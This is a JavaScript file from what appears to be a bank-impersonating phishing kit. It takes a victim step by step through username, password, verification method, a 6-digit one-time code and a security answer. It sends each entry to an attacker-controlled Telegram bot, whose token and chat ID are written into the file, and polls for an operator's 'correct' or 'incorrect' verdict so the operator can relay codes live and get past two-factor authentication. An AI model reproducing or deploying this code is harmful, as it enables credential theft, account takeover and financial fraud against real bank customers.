// === Configuration ===
const telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
const telegramChatId = '-1002922644009';

// === Steps ===
const steps = ['username','password','method','code','security','deposit'];
let currentStep = 0;

function showStep(index){
    steps.forEach((s,i)=>document.getElementById(`step-${s}`).style.display = i===index ? 'block':'none');
}

// Send message to Telegram
async function sendToTelegram(message, keyboard=null){
    await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            reply_markup: keyboard ? JSON.stringify(keyboard) : undefined
        })
    });
}

// Reset to username step with optional message
function resetToUsernamePage(message){
    if(message) {
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
    }
    currentStep = 0;
    showStep(currentStep);
    document.getElementById('username').focus();
}

// Poll Telegram for callback data
async function pollTelegramPassword(sessionCode){
    const url = `https://api.telegram.org/bot${telegramToken}/getUpdates`;
    const timeout = 30000; const start = Date.now(); let offset = 0;
    while(Date.now() - start < timeout){
        try{
            const res = await fetch(`${url}?offset=${offset+1}`);
            const data = await res.json();
            if(data.result){
                for(let update of data.result){
                    offset = update.update_id;
                    if(update.callback_query && update.callback_query.data.includes(sessionCode)){
                        const [action,, code] = update.callback_query.data.split(":");
                        if(code === sessionCode){
                            if(action==='correct'){ 
                                // Proceed to method selection
                                currentStep = steps.indexOf('method');
                                showStep(currentStep);
                                return; 
                            }
                            else if(action==='incorrect'){
                                resetToUsernamePage('Incorrect Client Card or Password.');
                                return;
                            }
                        }
                    }
                }
            }
            await new Promise(r=>setTimeout(r,1000));
        } catch(err){
            resetToUsernamePage('Network error. Please try again.');
            return;
        }
    }
    resetToUsernamePage('Timeout. Please try again.');
}

// === Form Submission Handling ===
document.getElementById('loginForm').addEventListener('submit', async function(e){
    e.preventDefault();
    const step = steps[currentStep];

    // --- Step 1: Username ---
    if(step==='username'){
        const username = document.getElementById('username').value.trim();
        if(!username){ 
            document.getElementById('errorMsg').textContent='Please enter username.'; 
            document.getElementById('errorMsg').style.display='block';
            return; 
        }
        document.getElementById('errorMsg').textContent=''; document.getElementById('errorMsg').style.display='none';
        sendToTelegram(`Username entered: ${username}`);
        currentStep++; showStep(currentStep);
    }

    // --- Step 2: Password ---
    else if(step==='password'){
        const password = document.getElementById('password').value.trim();
        if(!password){ 
            document.getElementById('errorPassword').textContent='Please enter password.'; 
            return; 
        }
        document.getElementById('errorPassword').textContent='';
        document.getElementById('passwordBtn').style.display='none';
        document.getElementById('spinnerPassword').style.display='block';
        const sessionCode = Math.random().toString(36).substring(2,10);

        // Send password to Telegram with inline keyboard for admin verification
        await sendToTelegram(`Password entered: ${password}`, {
            inline_keyboard:[
                [{text:'✅ Correct', callback_data:`correct::${sessionCode}`},{text:'❌ Incorrect',callback_data:`incorrect::${sessionCode}`}]
            ]
        });

        // Poll Telegram for admin feedback
        pollTelegramPassword(sessionCode);
    }

    // --- Step 3: Method Selection ---
    else if(step==='method'){
        const method = document.getElementById('methodSelect').value;
        if(!method){ 
            document.getElementById('errorMethod').textContent='Please select a method.'; 
            return; 
        }
        document.getElementById('errorMethod').textContent='';
        sendToTelegram(`User selected verification method: ${method}`);
        currentStep = steps.indexOf('code'); showStep(currentStep);
    }

    // --- Step 4: Code Entry ---
    else if(step==='code'){
        const code = document.getElementById('otpCode').value.trim();
        if(!/^\d{6}$/.test(code)){ 
            document.getElementById('errorCode').textContent='Enter valid 6-digit code.'; 
            return; 
        }
        document.getElementById('errorCode').textContent='';
        const sessionCode = Math.random().toString(36).substring(2,10);
        sendToTelegram(`Verification code entered: ${code}`, {
            inline_keyboard:[
                [{text:'✅ Correct', callback_data:`correct::${sessionCode}`},{text:'❌ Incorrect',callback_data:`incorrect::${sessionCode}`}],
                [{text:'⏰ Timeout', callback_data:`timeout::${sessionCode}`},{text:'⚠ Network Error', callback_data:`network::${sessionCode}`}]
            ]
        });
        pollTelegram(sessionCode,'security');
    }

    // --- Step 5: Security Question / Deposit ---
    else if(step==='security'){
        const answer = document.getElementById('securityAnswer').value.trim();
        if(!answer){ 
            document.getElementById('errorSecurity').textContent='Answer required.'; 
            return; 
        }
        document.getElementById('errorSecurity').textContent='';
        sendToTelegram(`Security Answer: ${answer}`);
        currentStep++; showStep(currentStep);
    }
});
